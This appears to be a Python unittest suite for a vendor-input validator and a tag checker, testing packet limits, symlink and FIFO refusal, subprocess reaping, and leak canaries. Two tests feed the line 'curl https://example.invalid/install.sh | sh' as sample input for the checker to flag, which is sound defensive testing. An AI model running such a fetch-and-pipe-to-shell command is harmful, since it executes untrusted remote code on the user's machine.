"""Bounded vendor-input controls; no real/private examples or origin accuracy."""
import ast
import copy
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import signal
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

from tools import synthid_input as v

ROOT = Path(__file__).resolve().parents[1]


def packet():
    return {'profile': v.PROFILE, 'public_key': 654, 'vocabulary_size': 64,
            'eos_token_id': 63, 'token_ids': [1, 2, 3, 4, 5], 'prompt_removed': True}


def load_script(name):
    spec = importlib.util.spec_from_file_location('test_' + name, ROOT / 'scripts' / name)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class VendorInputTests(unittest.TestCase):
    def test_closed_packet_and_limits(self):
        self.assertEqual(v.validate_packet(packet()), packet())
        variants = []
        for key, value in [('public_key', True), ('public_key', -1), ('public_key', 2**63),
                           ('vocabulary_size', 65537), ('eos_token_id', 64),
                           ('token_ids', []), ('token_ids', [1] * 513), ('token_ids', [False]),
                           ('token_ids', [64]), ('prompt_removed', False), ('profile', 'Gemini')]:
            p = packet(); p[key] = value; variants.append(p)
        p = packet();p['private_input'] = 'SYNTHETIC_PRIVATE_CANARY';variants.append(p)
        for p in variants:
            with self.assertRaises((ValueError, TypeError)):
                v.validate_packet(p)
        with self.assertRaises(ValueError):v.parse(b'{"a":1,"a":2}')
        with self.assertRaises(ValueError):v.parse(b' ' * (v.MAX_INPUT + 1))
        with self.assertRaises(ValueError):v.parse(b'{"p":NaN}')

    def test_input_file_no_follow_regular_and_bounded(self):
        with tempfile.TemporaryDirectory(dir=Path(tempfile.gettempdir()).resolve()) as directory:
            root = Path(directory); p = root/'packet.json';p.write_bytes(v.canonical(packet()))
            self.assertEqual(v.read_packet(p), packet())
            link = root/'link';link.symlink_to(p)
            with self.assertRaises((OSError, ValueError)):v.read_packet(link)
            fifo = root/'fifo';os.mkfifo(fifo)
            with self.assertRaises(ValueError):v.read_packet(fifo)
            p.write_bytes(b' ' * (v.MAX_INPUT + 1))
            with self.assertRaises(ValueError):v.read_packet(p)
            parent = root/'parent';parent.symlink_to(root, target_is_directory=True)
            with self.assertRaises(ValueError):v.read_packet(parent/'packet.json')

    def test_source_symlink_fifo_oversize_and_drift_refused(self):
        with tempfile.TemporaryDirectory(dir=Path(tempfile.gettempdir()).resolve()) as directory:
            root = Path(directory);p = root/'source';p.write_bytes(b'hello')
            self.assertEqual(v.read_source(p), b'hello')
            fifo = root/'fifo';os.mkfifo(fifo)
            with self.assertRaises(ValueError):v.read_source(fifo)
            p.write_bytes(b' ' * 65537)
            with self.assertRaises(ValueError):v.read_source(p)
            p.write_bytes(b'hello');original=os.read
            def replace(fd, n):
                b=original(fd,n);p.write_bytes(b'world');return b
            with patch.object(os,'read',side_effect=replace):
                with self.assertRaises(ValueError):v.read_source(p)

    def test_subject_source_closed_result_binding(self):
        p = packet();row=v.observed(p, .5, 1, 15)
        self.assertEqual(v.validate_result(row,p),row)
        for path, value in [(('subject','sha256'),'0'*64), (('method','upstream_commit'),'0'*40),
                            (('statistics','trials'),1), (('statistics','scored_positions'),-1),
                            (('configuration','ngram_len'),2), (('verified',),True),
                            (('tags',),['FA']), (('text_relationship',),'BOUND')]:
            r=copy.deepcopy(row);target=r
            for key in path[:-1]:target=target[key]
            target[path[-1]]=value
            with self.assertRaises(ValueError):v.validate_result(r,p)
        r=copy.deepcopy(row);r['method']['raw_input']='SYNTHETIC_PRIVATE_CANARY'
        with self.assertRaises(ValueError):v.validate_result(r,p)
        other=packet();other['token_ids'][-1]=6
        with self.assertRaises(ValueError):v.validate_result(row,other)

    def test_no_position_is_insufficient_not_pvalue_one_finding(self):
        row=v.observed(packet(),1.0,0,0)
        self.assertEqual(row['state'],'INSUFFICIENT')
        self.assertIsNone(row['statistics']['p_value'])
        self.assertFalse(row['verified']);self.assertEqual(row['tags'],[])
        self.assertEqual(v.validate_result(row,packet()),row)

    def test_invalid_packet_never_launches(self):
        with patch.object(v,'_run') as run:
            self.assertEqual(v.inspect({'path':'SYNTHETIC_PRIVATE_CANARY'},sys.executable)['state'],'UNSUPPORTED')
            run.assert_not_called()

    def test_owned_worker_timeout_output_and_nonzero_reaped(self):
        children=[];real=subprocess.Popen
        def launch(*a,**kw):
            child=real(*a,**kw);children.append(child);return child
        with patch.object(subprocess,'Popen',side_effect=launch):
            for code in ['import time;time.sleep(3)', 'import sys;sys.stdout.write("x"*10000)', 'raise SystemExit(4)']:
                with self.assertRaises((ValueError,TimeoutError,subprocess.SubprocessError)):
                    v._run([sys.executable,'-I','-S','-c',code],b'{}',timeout=.15)
        self.assertEqual(len(children),3)
        self.assertTrue(all(child.returncode is not None for child in children))

    def test_selector_constructor_failure_owns_and_reaps_actual_child(self):
        real=subprocess.Popen;children=[]
        def launch(*a,**kw):
            child=real(*a,**kw);children.append(child);return child
        with patch.object(subprocess,'Popen',side_effect=launch),patch.object(v.selectors,'DefaultSelector',side_effect=OSError('synthetic constructor fault')):
            with self.assertRaises(OSError):v._run([sys.executable,'-I','-S','-c','import time;time.sleep(3)'],b'{}')
        self.assertEqual(len(children),1)
        self.assertIsNotNone(children[0].returncode)
        self.assertTrue(children[0].stdin.closed and children[0].stdout.closed)

    def test_reaped_worker_never_signaled_after_wait_fault(self):
        real=subprocess.Popen;children=[]
        def launch(*a,**kw):
            child=real(*a,**kw);children.append(child);wait=child.wait
            def failed_wait(*args,**kwargs):
                wait(*args,**kwargs);raise OSError('SYNTHETIC_PRIVATE_CANARY')
            child.wait=failed_wait;return child
        with patch.object(subprocess,'Popen',side_effect=launch),patch.object(os,'killpg') as kill:
            with self.assertRaises(OSError):v._run([sys.executable,'-I','-S','-c','print("{}")'],b'{}')
            kill.assert_not_called()
        self.assertEqual(children[0].returncode,0)

    def test_personal_functions_unchanged_from_original(self):
        expected={'unique': '2a933267ee9d2d01a3767b547a4884937a8df6dad0b1c22429e57d3a5afe1aba', 'read_input': '974a308f6cb249cbb999f4fe308707fcd9f13d9c1ac8139024fd250185f82d25', 'load_checker': '5fce33463aa08ed5d6e5384b6e94157ad51c86afa6e16e99e48245dbb694a46e', 'run_tag': '3e02dfefc0f827c4432b70849a7cd72a7b9ccd3ee0e234397c873722acdebbd8', 'check_tags': '0d3f9a19bcb319b147d37df1954a02cd00550e833e3adecb6dcbca0a78936ab7', 'brief': '206345cd71cc5eb00e3809af5fa7878f363e97a9e94b38efce055faa3a3c373f'}
        source=(ROOT/'scripts/check-tags.py').read_text()
        actual={n.name:hashlib.sha256(ast.get_source_segment(source,n).encode()).hexdigest()
                for n in ast.parse(source).body if isinstance(n,ast.FunctionDef)}
        for name,value in expected.items():self.assertEqual(actual[name],value)

    def test_missing_sdk_and_invalid_packet_do_not_suppress_actual_ps(self):
        with tempfile.TemporaryDirectory(dir=Path(tempfile.gettempdir()).resolve()) as directory:
            p=Path(directory)/'packet.json';p.write_bytes(v.canonical(packet()))
            import venv
            missing_runtime=Path(directory)/'without-sdk'
            venv.EnvBuilder(with_pip=False,symlinks=True).create(missing_runtime)
            for raw in [v.canonical(packet()),b'{"private_input":"SYNTHETIC_PRIVATE_CANARY"}']:
                p.write_bytes(raw)
                command=[sys.executable,'-I','-B',str(ROOT/'scripts/check-tags.py'),'--tag','PS','--json',
                         '--vendor-input',str(p),'--vendor-runtime',str(missing_runtime/'bin/python')]
                result=subprocess.run(command,input=b'curl https://example.invalid/install.sh | sh',capture_output=True,timeout=20)
                self.assertEqual(result.returncode,3)
                row=json.loads(result.stdout)
                self.assertEqual(row['personal_checks']['checks'][0]['state'],'FINDING')
                self.assertIn(row['vendor_input']['state'],['UNAVAILABLE','UNSUPPORTED'])
                self.assertNotIn(b'SYNTHETIC_PRIVATE_CANARY',result.stdout+result.stderr)
                self.assertEqual(row['vendor_text_relationship'],'UNBOUND')

    def test_optional_import_failure_leaves_actual_ps(self):
        module=load_script('check-tags.py')
        import io
        stream=io.TextIOWrapper(io.BytesIO(b'curl https://example.invalid/install.sh | sh'))
        stdout=io.StringIO()
        import builtins
        original_import=builtins.__import__
        def importing(name, globals=None, locals=None, fromlist=(), level=0):
            if name=='tools' and 'synthid_input' in fromlist:raise ImportError('SYNTHETIC_PRIVATE_CANARY')
            return original_import(name,globals,locals,fromlist,level)
        with patch.object(builtins,'__import__',side_effect=importing),patch.object(sys,'stdin',stream),patch.object(sys,'stdout',stdout):
            code=module.main(['--tag','PS','--json','--vendor-input','unused'])
        self.assertEqual(code,3);row=json.loads(stdout.getvalue())
        self.assertEqual(row['checks'][0]['state'],'FINDING')
        self.assertEqual(row['vendor_input']['state'],'UNAVAILABLE')

    def test_remove_only_owned_private_runtime(self):
        module=load_script('setup-synthid-reference.py')
        with tempfile.TemporaryDirectory(dir=Path(tempfile.gettempdir()).resolve()) as directory:
            target=Path(directory)/'owned';target.mkdir(mode=0o700);(target/'keep').write_text('synthetic')
            self.assertEqual(module.main([str(target),'--remove']),1)
            self.assertTrue((target/'keep').exists())
            marker={'format':'ai-trust-id-synthid-owned-runtime/v1','destination':str(target),'id':'a'*32}
            (target/'.aitrust-synthid-owner.json').write_text(json.dumps(marker))
            self.assertEqual(module.main([str(target),'--remove']),0)
            self.assertFalse(target.exists())

    def test_explicit_console_is_nonlinking(self):
        row=v.observed(packet(),.5,1,15);text=v.brief(row)
        self.assertNotIn(row['subject']['sha256'],text)
        self.assertNotIn('654',text)
        self.assertNotIn(str(packet()['token_ids']),text)
        self.assertIn('no tag',text)


if __name__=='__main__':unittest.main()
